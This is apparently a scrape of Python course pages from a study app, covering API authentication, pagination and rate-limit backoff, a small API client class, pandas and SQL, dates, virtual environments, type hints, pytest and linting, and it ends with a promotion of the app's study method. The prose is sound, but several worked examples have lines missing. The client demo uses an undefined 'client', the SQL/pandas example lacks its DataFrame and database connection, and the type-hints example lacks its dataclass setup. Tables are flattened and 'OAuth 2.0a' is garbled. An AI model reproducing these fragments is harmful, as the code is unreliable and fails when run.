headers = {"X-Api-Key": key}                          # header name varies: read the docs
requests.get(url, params={"api_key": key})            # some APIs: a query parameter
requests.get(url, auth=("user", "pass"))              # HTTP basic auth (a base64 header)

session = requests.Session()
session.headers.update({"Authorization": f"Bearer {token}"})   # set once, sent every time

Where the secret lives

import os
key = os.environ["API_KEY"]                 # fails fast if it is missing
port = os.environ.get("PORT", "8000")       # with a default

from dotenv import load_dotenv               # pip install python-dotenv
load_dotenv()                                # reads .env into the environment for local work
secret = os.getenv("SECRET_KEY")

import keyring                               # the OS credential store
password = keyring.get_password("my_service", "my_user")

Production jobs get their variables from the scheduler (GitHub Actions secrets, the server's service definition). Local development gets them from a .env file that is listed in .gitignore. Nothing gets them from source code.

401, 403 and refreshing

A 401 means the server does not know who you are: the token is missing, wrong or expired. A 403 means it knows and you are not allowed. The refresh skeleton is: make the call; if r.status_code == 401: token = refresh_token() and retry once with the new token. OAuth flows exist for acting on behalf of a user; for service-to-service scripts, tokens and keys cover nearly everything.

OAuth 2.0a flow that ends in a bearer tokenneeded when acting for a user, not for a service

📘 Pagination and rate limits

An API never hands over a big collection in one response. It pages, and it limits how fast you may ask. A client that handles both is a loop with two exits: no next page, and too many failures.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Every "download all the records" script hits these two walls. The naive version stops after page one, or gets banned by a 429 it never looked at. The robust version is twenty lines and works for any API.

Two pagination styles

# page / offset: you compute the next request
GET /items?page=2&limit=100          or          GET /items?offset=100&limit=100
# cursor / next link: the response tells you
{"items": [...], "next_cursor": "abc123"}       or          {"items": [...], "next": "https://.../items?after=abc123"}

The loop

all_items, page = [], 1
while page is not None:
    data = get_page(page)                 # one request, with retry inside
    all_items.extend(data["items"])       # extend, not append: flatten as you go
    page = data.get("next")               # None when the collection is exhausted

For page numbers, stop when a page comes back empty or shorter than limit. For cursors, follow next until it is absent. Always cap the number of pages so a misbehaving API cannot loop forever.

429 and backoff

A 429 Too Many Requests means slow down, not give up. Read the Retry-After header and sleep that long; if there is none, back off exponentially: time.sleep(2 ** attempt) gives 1, 2, 4, 8, 16 seconds, ideally with a little random jitter so many clients do not retry in lockstep. Retry 5xx the same way, give up after a fixed number of attempts, and log what happened. A polite time.sleep(1) between calls prevents most 429s in the first place.

Letting a library retry

from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
retry = Retry(total=5, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount("https://", HTTPAdapter(max_retries=retry))     # every session.get now retries transparently

from tenacity import retry, stop_after_attempt, wait_fixed
@retry(stop=stop_after_attempt(3), wait=wait_fixed(2))
def call_api(): ...

200here is the pageextend, read the next marker
429too many requestssleep Retry-After (or backoff), retry the same request
500 / 502 / 503 / 504server troublebackoff and retry a few times
401 / 403authentication problemdo not retry blindly; fix the credentials
404no such pagestop: usually you walked past the end
▸ WORKED EXAMPLE — three pages, one throttle, ten items
import json, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests

ITEMS = list(range(1, 11))          # ten items, four per page
calls = {"n": 0}

class Handler(BaseHTTPRequestHandler):          # a stand-in API that throttles the second call
    def do_GET(self):
        calls["n"] += 1
        page = int(parse_qs(urlparse(self.path).query).get("page", ["1"])[0])
        if calls["n"] == 2:
            self._send(429, {"error": "slow down"}, {"Retry-After": "1"})
            return
        chunk = ITEMS[(page - 1) * 4: page * 4]
        self._send(200, {"items": chunk, "next": page + 1 if page * 4 < len(ITEMS) else None})
    def _send(self, status, obj, extra=None):
        data = json.dumps(obj).encode()
        self.send_response(status)
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, *a):
        pass

server = HTTPServer(("127.0.0.1", 0), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()
url = f"http://127.0.0.1:{server.server_port}/items"

def get_page(page, attempts=5):
    for attempt in range(attempts):
        r = requests.get(url, params={"page": page, "limit": 4}, timeout=5)
        if r.status_code == 429:
            wait = float(r.headers.get("Retry-After", 2 ** attempt))
            print(f"  429 on page {page}: sleeping {wait:g}s (attempt {attempt + 1})")
            time.sleep(wait)
            continue
        r.raise_for_status()
        return r.json()
    raise RuntimeError("gave up after retries")

all_items, page = [], 1
while page is not None:
    data = get_page(page)
    all_items.extend(data["items"])
    print(f"page {page}: {data['items']} -> next {data['next']}")
    page = data["next"]
print(all_items, "| requests made:", calls["n"])
server.shutdown()

📘 Building a tiny API client

When a script makes more than a couple of calls to the same API, wrap the API in a small class. The rest of the program then calls client.get_user(42) and never sees a URL, a header or a status code again.

🎯 WHY THIS MATTERS

Auth, retries, timeouts and error handling written once instead of at every call site; tests that mock one object instead of the network; and a single file to change when the provider changes. That is what the class buys, and it is why every SDK you have ever used is shaped like this.

The shape

class ApiError(Exception): ...                      # callers catch this, not requests internals

class APIClient:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()             # connection reuse, shared headers
        self.session.headers.update({"Authorization": f"Bearer {token}"})

    def __repr__(self):                                # never print the token
        return f"APIClient(base_url={self.base_url!r}, token='***')"

    def _request(self, method, path, **kw):            # ONE place for timeout, errors, JSON
        r = self.session.request(method, self.base_url + path, timeout=10, **kw)
        if not r.ok:
            raise ApiError(f"{method} {path} -> {r.status_code}")
        return r.json()

    def get_user(self, user_id: int) -> dict:          # public methods read like the domain
        """Fetch one user by id."""
        return self._request("GET", f"/users/{user_id}")

Validate at the boundary

Data from outside your program deserves checking before it spreads. A Pydantic model turns the JSON into a typed object and refuses bad shapes: class User(BaseModel): id: int; name: str, then User(**data) or User.model_validate(data). The client's public methods can return models instead of dicts, and callers get autocomplete and certainty.

Testing the client

Because everything goes through self.session, a test can replace that one attribute with a fake (or use the responses library) and exercise the class with no network. Give methods type hints and one-line docstrings: that is the whole interface documentation a small client needs.

import json, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
from pydantic import BaseModel, ValidationError

class Handler(BaseHTTPRequestHandler):          # stand-in API
    def do_GET(self):
        if self.path == "/users/42":
            self._send(200, {"id": 42, "name": "Ann", "email": "ann@example.com"})
        elif self.path == "/users/7":
            self._send(200, {"id": "seven", "name": None})
        else:
            self._send(404, {"error": "no such user"})
    def _send(self, status, obj):
        data = json.dumps(obj).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, *a):
        pass

server = HTTPServer(("127.0.0.1", 0), Handler)
threading.Thread(target=server.serve_forever, daemon=True).start()

class ApiError(Exception):
    pass

class User(BaseModel):
    id: int
    name: str
    email: str | None = None

class APIClient:
    def __init__(self, base_url, token):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"Authorization": f"Bearer {token}", "Accept": "application/json"})

    def __repr__(self):
        return f"APIClient(base_url={self.base_url!r}, token='***')"

    def _request(self, method, path, **kw):
        r = self.session.request(method, self.base_url + path, timeout=10, **kw)
        if not r.ok:
            raise ApiError(f"{method} {path} -> {r.status_code}: {r.json().get('error', r.text)}")
        return r.json()

    def get_user(self, user_id: int) -> User:
        """Fetch one user by id."""
        return User(**self._request("GET", f"/users/{user_id}"))

print(client)
print(client.get_user(42))
try:
    client.get_user(99)
except ApiError as e:
    print("ApiError:", e)
try:
    client.get_user(7)
except ValidationError as e:
    print("ValidationError:", [(err["loc"][0], err["msg"]) for err in e.errors()])

📘 DataFrames versus SQL: when to use which

SQL and pandas express the same handful of operations: filter, group, join, sort, select. The question is never which one is better; it is where the work should happen. The answer depends on where the data lives and how big it is.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Pulling a warehouse table onto a laptop to filter it in pandas is the most common performance mistake in analytics. Pushing the filtering and aggregation to the engine and pulling only the result is the professional pattern, and pandas is for what comes after.

SQLpandas
SELECT a, b FROM tdf[["a", "b"]]
WHERE price > 100df[df["price"] > 100]
GROUP BY regiondf.groupby("region")
JOIN customers ON ...pd.merge(orders, customers, on=...)
ORDER BY price DESCdf.sort_values("price", ascending=False)
LIMIT 5df.head()
SELECT DISTINCT countrydf["country"].unique()
CASE WHEN ... THEN ... ENDnp.where(cond, a, b)

Where the work should happen

If the data is in a database or warehouse, write the WHERE, GROUP BY and JOIN in SQL and read the result: df = pd.read_sql(query, conn). The engine is built for scanning millions of rows; your laptop is not, and a 500 GB table does not fit in memory in any language. Use pandas for the last mile: reshaping, feature engineering, quick plots, and anything iterative where you want to look at the result and change your mind.

First look at a DataFrame

df = pd.read_csv("data.csv")
df.head()                # first five rows
df.shape                 # (rows, columns)
df.dtypes                # each column's type
df["price"]              # one column, a Series
df[["id", "name"]]       # several columns, a DataFrame
df = df.drop(columns="temp")
df = df.rename(columns={"old_name": "new_name"})
df = df.sort_values("price", ascending=False).reset_index(drop=True)

Polars and DuckDB

Polars is a newer DataFrame library that runs multithreaded, plans queries lazily and speaks Arrow natively, so it is often several times faster than pandas on large local files. DuckDB runs SQL directly over DataFrames and Parquet files: duckdb.query("SELECT ... FROM df") blurs the line entirely. Know they exist; pandas is still the lingua franca.

▸ WORKED EXAMPLE — the same question asked in SQL and in pandas

import pandas as pd

    "region": ["east", "west", "east", "north", "west", "east"],
    "amount": [120, 80, 200, 50, 130, 90],
})

df.to_sql("sales", conn, index=False)

sql = pd.read_sql("""
    SELECT region, SUM(amount) AS total, COUNT(*) AS n
    FROM sales WHERE amount > 60
    GROUP BY region ORDER BY total DESC
""", conn)
pdx = (df[df["amount"] > 60]
         .groupby("region").agg(total=("amount", "sum"), n=("amount", "count"))
         .sort_values("total", ascending=False).reset_index())

The pandas chain below it does the same steps in the same order: boolean mask, groupby, named aggregation, sort_values, reset_index so the group key is a column again. The two frames are identical (equals is True). The difference is only where it runs: the SQL version would work unchanged against a warehouse holding a billion rows.

📘 Read, filter, group, aggregate

Nine tenths of business questions are one pipeline with different nouns: load a table, keep the rows that matter, group by something, compute a number per group, sort, save. This lesson is that pipeline, call by call.

🎯 WHY THIS MATTERS

"Total amount per region for orders over 100, largest first" is the shape of most requests you will get. Being able to write it in pandas without looking anything up is the skill that turns a spreadsheet job into a script.

Inspect, then filter

df = pd.read_csv("sales.csv")
df.info(); df.describe()                            # types and missing values; summary statistics
df[df["amount"] > 100]                              # boolean mask
df[(df["price"] > 100) & (df["category"] == "books")]   # combine with & and |, each side in parentheses
df[df["category"].isin(["books", "toys"])]
df.query("price > 100 and category == 'books'")     # the same, as a string
df.loc[rows, ["id", "name"]]                        # select by label

Group and aggregate

df.groupby("region")["amount"].sum()
df.groupby("region")["amount"].agg(["sum", "mean", "count"])
df.groupby("category").agg(total=("amount", "sum"), n=("amount", "count"))   # named aggregation: tidy columns
df.groupby("customer_id")["amount"].agg(lambda s: s.max() - s.min())          # any function
df.loc[df.groupby("customer_id")["amount"].idxmax()]                          # the top row per group
df["country"].nunique(); df["country"].value_counts()

Finish with .sort_values("total", ascending=False) and .reset_index() so the group key becomes an ordinary column, then df.to_csv("out.csv", index=False).

📘 Merging, joining and reshaping

merge is a SQL join, concat stacks tables, pivot_table and melt move between long and wide. Half of pandas fluency is knowing which shape a tool wants and which call gets you there; the other half is checking row counts after every merge.

🎯 WHY THIS MATTERS

Most real datasets are several tables. Joining them correctly, noticing when a join silently multiplied your rows, and reshaping for a chart or a report are the daily work of analytics engineering.

merge is a join

pd.merge(orders, customers, on="customer_id", how="inner")   # matches only
pd.merge(orders, customers, on="customer_id", how="left")    # keep every order
pd.merge(df1, df2, left_on="user_id", right_on="id")         # different key names
pd.merge(orders, customers, on="customer_id", how="left", indicator=True)   # adds a _merge column
pd.merge(orders, customers, on="customer_id", validate="many_to_one")       # raises if customers has duplicate keys

how is inner, left, right or outer. Check len before and after: a row count that grew means duplicate keys on the other side, a many-to-many you did not intend. validate= turns that check into an exception.

concat, pivot, melt

pd.concat([df1, df2], ignore_index=True)     # stack rows
pd.concat([df1, df2], axis=1)                # side by side
wide = df.pivot_table(index="month", columns="category", values="amount", aggfunc="sum")   # long -> wide
long = wide.reset_index().melt(id_vars="month", var_name="category", value_name="amount")  # wide -> long
df.set_index("id")                           # promote a column to the index
pd.crosstab(df.gender, df.country)           # quick two-way counts

Long (tidy) is one row per observation, which is what plotting libraries and models want. Wide is one row per entity with a column per category, which is what people want to read. pivot_table aggregates on the way to wide; melt unrolls back.

📘 Dates and times in pandas

Dates arrive as strings and stay useless until they become real datetimes. After that one conversion, pandas can extract parts, slice ranges, resample to months, roll windows and convert timezones with a few short calls.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Weekly reports, month-end totals, days-between calculations and "what day of the week is busiest" are all date questions. They are quick when the column is a datetime and painful when it is text.

Parse first

df["date"] = pd.to_datetime(df["date"])                        # strings -> datetime64
df = pd.read_csv("sales.csv", parse_dates=["date"])              # or at load time
pd.to_datetime(df["date"], errors="coerce")                      # unparseable -> NaT instead of an error
pd.to_datetime(df["date"], format="%d/%m/%Y")                    # be explicit when the format is ambiguous

The .dt accessor and time-indexed operations

df["date"].dt.year, df["date"].dt.month, df["date"].dt.dayofweek, df["date"].dt.day_name()
ts = df.set_index("date")                                        # a DatetimeIndex unlocks the rest
ts.loc["2024-01-01":"2024-03-31"]                                # slice by string dates
ts["sales"].resample("ME").sum()                                 # monthly totals (month-end)
ts["sales"].rolling(7).mean()                                    # 7-row moving average
pd.date_range("2024-01-01", "2024-12-31", freq="D")              # every day of the year
(df["end"] - df["start"]).dt.days                                # Timedeltas -> integer days

resample is groupby for time: it needs a datetime index and a frequency alias. Since pandas 2.2 the month-end alias is "ME" (the old "M" is deprecated); "MS" is month-start, "W" weekly, "D" daily, "QE" quarter-end.

Timezones

utc = df["date"].dt.tz_localize("UTC")               # naive -> aware: declare what the clock meant
local = utc.dt.tz_convert("America/New_York")          # aware -> aware: change the display zone

Store and compute in UTC, convert for display. Comparing a timezone-aware column with a naive one raises a TypeError, which is pandas protecting you from a silent hour-shift bug.

Old aliasUse nowMeaning
"M""ME"month end
"Q""QE"quarter end
"Y" / "A""YE"year end
"H""h"hourly
"MS""MS"month start (unchanged)
▸ WORKED EXAMPLE — parse, extract, resample, roll, and convert a timezone
import pandas as pd

df = pd.DataFrame({"date": ["2026-01-05", "2026-01-20", "2026-02-03", "2026-02-28", "2026-03-15"],
                   "sales": [100, 150, 80, 120, 200]})
df["date"] = pd.to_datetime(df["date"])
df["month"] = df["date"].dt.month
df["dow"] = df["date"].dt.dayofweek
df["day_name"] = df["date"].dt.day_name()
print(df)
ts = df.set_index("date")
print(ts["sales"].resample("ME").sum())
print(ts.loc["2026-01-01":"2026-02-15", "sales"].tolist())

📘 Virtual environments and pip

A virtual environment is a private copy of Python's package folder for one project. Project A can have pandas 2.0 and project B pandas 2.2, nothing you install for one can break the other, and a requirements file lets a teammate rebuild yours exactly.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

"Works on my machine" is almost always an environment problem. One environment per project, with pinned versions committed to git, is the discipline that makes a script run for the next person and for you in six months.

One environment per project

python -m venv .venv                 # create it, in the project folder
source .venv/bin/activate            # macOS / Linux
.venv\Scripts\activate               # Windows
python -c "import sys; print(sys.prefix)"   # points inside .venv when active
deactivate                           # back to the system Python

Activation puts the environment's python and pip first on your PATH. Editors like VS Code pick up .venv automatically. Add .venv/ to .gitignore: it is rebuilt from the requirements file, never committed.

pip essentials

pip install requests                 # latest
pip install pandas==2.0.3            # exact version
pip install -r requirements.txt      # everything a project needs
pip freeze > requirements.txt        # record exact versions of what is installed
pip uninstall requests
pip show pandas                      # version and location
python -m pip install --upgrade pip

Faster tools

uv is a drop-in that does the same jobs much faster: uv venv then uv pip install -r requirements.txt, with lockfiles for exact reproducibility. Poetry and PDM manage the same thing through pyproject.toml. Whatever the tool, the rule is the same: pin versions, commit the file, keep the environment out of git.

📘 Type hints, the useful core

A type hint says what a function expects and returns: def total(prices: list[float], tax: float = 0.0) -> float:. Python does not enforce it when the code runs. Your editor and a checker like mypy read it and find mistakes before the code runs, which is where you want to find them.

🎯 WHY THIS MATTERS

Hints are documentation that cannot go stale, autocomplete that actually knows your data, and a checker that catches "passed a string where a list was expected" at the moment you write it. On a team they are how a function explains itself.

The syntax that covers most code

def find_user(user_id: int) -> dict | None: ...       # may return nothing (3.10+; Optional[dict] before)
def total(prices: list[float], tax: float = 0.0) -> float: ...
mapping: dict[str, int]
value: int | str
cb: Callable[[int], bool]                              # takes an int, returns a bool
anything: Any                                          # the escape hatch: the checker looks away

Built-in generics (list[int], dict[str, int]) need no import. Callable, Any, Optional and TypedDict come from typing. Every Any is a place the checker goes blind, so use it sparingly.

Dataclasses

from dataclasses import dataclass, field

@dataclass
class Point:
    x: float
    y: float
    tags: list[str] = field(default_factory=list)   # mutable default: use a factory

The hints double as the field list: @dataclass writes __init__, __repr__ and __eq__ for you. Add frozen=True for an immutable record.

Running a checker

pip install mypy
mypy script.py            # or pyright; both read the hints and report mismatches

Start pragmatic: annotate public function signatures and dataclasses, skip obvious locals. Hints on the boundary of a module pay for themselves first.

int | streither type

import subprocess, sys

from typing import Callable

    x: float
    y: float
    tags: list[str] = field(default_factory=list)

def find_user(user_id: int) -> dict | None:
    return {"id": 1, "name": "Ann"} if user_id == 1 else None

def total(prices: list[float], tax: float = 0.0) -> float:
    return sum(prices) * (1 + tax)

def keep(cb: Callable[[int], bool], xs: list[int]) -> list[int]:
    return [x for x in xs if cb(x)]

print(Point(1.5, 2.0), Point(1.5, 2.0) == Point(1.5, 2.0))
print(find_user(1), find_user(2))
print(total([10.0, 5.0], tax=0.2))
print(keep(lambda n: n % 2 == 0, [1, 2, 3, 4]))
print(total.__annotations__)

# hints are not enforced when the code runs - a checker reads them beforehand

The hinted functions run exactly as unhinted ones would; __annotations__ shows the hints are just recorded metadata. Then bad.py calls total with a string and a string keyword. Python would happily run that file until it crashed inside sum. mypy read the hints and reported both mismatches with line numbers, before anything ran.

    x: int
    y: int

  • The value is a plain dict — isinstance(pt, dict) prints True. Nothing new exists at run time.
  • The annotations are recorded, which is what lets mypy and your editor autocomplete the keys and flag a typo.
  • The last line is the limit: a string where an int was declared runs happily. TypedDict is checked by the type-checker, never by Python.
🎯 EXAM TIP
Reach for TypedDict when the data stays inside your own program and you want the keys known — it is cleaner than dict[str, Any] and costs nothing at run time. Reach for Pydantic when the data arrives from outside and actually needs validating.

📘 pytest: the basics that matter

pytest finds files named test_*.py, runs every function named test_*, and treats a plain assert as the whole assertion API. When an assertion fails it shows the values involved, so a failing test explains itself.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

A script with tests can be changed with confidence and handed to someone else. A script without tests can only be changed by the person who remembers everything about it, for as long as they remember.

Discovery, assert, and running

# test_calc.py
from calc import add

def test_add():
    assert add(2, 3) == 5

# terminal
pytest -q                          # everything under the current folder
pytest test_calc.py::test_add      # one test
pytest -k "add" -x                 # tests whose name contains add; stop at the first failure
pytest --cov=calc                  # with the pytest-cov plugin: coverage report

Fixtures: setup as an argument

@pytest.fixture
def sample_data():
    return [1, 2, 3]

def test_sum(sample_data):         # naming the fixture as a parameter injects it, fresh per test
    assert sum(sample_data) == 6

def test_writes(tmp_path):         # built in: a unique temporary directory
    (tmp_path / "out.txt").write_text("ok")

Other built-ins: monkeypatch to set environment variables or attributes for one test, capsys to read printed output. Fixtures that need teardown yield instead of return.

Parametrize, raises, and faking the network

@pytest.mark.parametrize("a,b,expected", [(1, 2, 3), (5, 5, 10), (0, 0, 0)])
def test_add(a, b, expected):
    assert add(a, b) == expected

def test_divide_by_zero():
    with pytest.raises(ZeroDivisionError):
        divide(1, 0)

from unittest.mock import patch
with patch("requests.get") as fake:
    fake.return_value.json.return_value = {"id": 1}
    ...                            # code under test calls the fake, no network

📘 Formatting and linting: Black and Ruff

A formatter rewrites layout so every file looks the same; a linter reads the code and reports problems, some of which it can fix. Black is the formatter that ended formatting debates; Ruff is the linter (and, now, a formatter too) fast enough to run on every save.

📊 FIGURE — how this section fits together
🎯 WHY THIS MATTERS

Code review should be about logic, not commas. When the tools carry the style and CI refuses code that does not pass them, reviewers spend their attention where it matters and nobody argues about indentation again.

Formatter versus linter

ToolJobCommands
Blackreformat to one canonical styleblack . / black --check . (no changes; exit 1 if anything would change)
Rufffind unused imports, undefined names, risky patterns; fix what is mechanicalruff check . / ruff check --fix .
Ruff formatBlack-compatible formatting, fasterruff format .
isortsort and group imports (Ruff can do this too)isort .
pre-commitrun all of the above on the files you are about to commitpre-commit install / pre-commit run --all-files

Sharing the settings

# pyproject.toml
[tool.black]
line-length = 100

[tool.ruff]
line-length = 100
select = ["E", "F", "I"]        # pycodestyle, pyflakes, import order

# .pre-commit-config.yaml
repos:
  - repo: https://github.com/psf/black
    rev: 24.4.2
    hooks:
      - id: black
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.5.0
    hooks:
      - id: ruff
        args: [--fix]

Settings live in pyproject.toml so the whole team shares one configuration. pre-commit install wires the hooks into git; from then on a commit with unformatted or lint-failing code is refused on the spot. A single line can opt out with # noqa: E501 when a long line is genuinely clearer.

🧠 The Aistote Method (J-Method)

THE IDEA
The Aistote app is built on two of the most evidence-backed study techniques — active recall and spaced repetition — run in short, intense 25-minute blocks (its "J-Method"). Instead of slowly re-reading, you spend the time testing yourself and re-testing what you miss. This app already has every tool the method needs.
THE 3-STEP LOOP
StepWhat you doWhere in this app
1. ConvertTurn the material into questions instead of re-reading it.Open a section, skim the lesson once, then jump to its Quiz.
2. RecallAnswer from memory first — no peeking — then check.Take the section Quiz, or a PA / OA simulation; rate your confidence.
3. Space itRe-test only what you missed, on a growing schedule.Every miss becomes a Flashcard; review them on the app's spaced-repetition schedule.
A 25-MINUTE J-METHOD SESSION
TimeDo this
0–3 minSkim the lesson's key terms and the big idea — don't memorize yet, just get the lay of the land.
3–18 minTake the section quiz (or a 15-question drill). Try to recall the answer first, reveal it after.
18–23 minRedo only the questions you got wrong.
23–25 minSend the stubborn ones to Flashcards and note tomorrow's quick review.
Start the block with the ⚡ Focus timer (25 min) on any lesson — that is your J-Method session.
⚠️ THE ONE RULE
Always try to answer from memory before you look. The effort of retrieving is what actually builds the memory — re-reading feels productive but barely moves it.
WHY IT WORKS

Spaced repetition reviews each fact just as you're about to forget it, moving it into long-term memory with the fewest reps. The 25-minute block simply makes you actually do both, every day.
DAILY RHYTHM
Two or three 25-minute J-Method blocks a day (new material in one, missed-question review in the next) beats a single long cram session — and it's how the Aistote method delivers "learn it in 25 minutes" instead of hours.
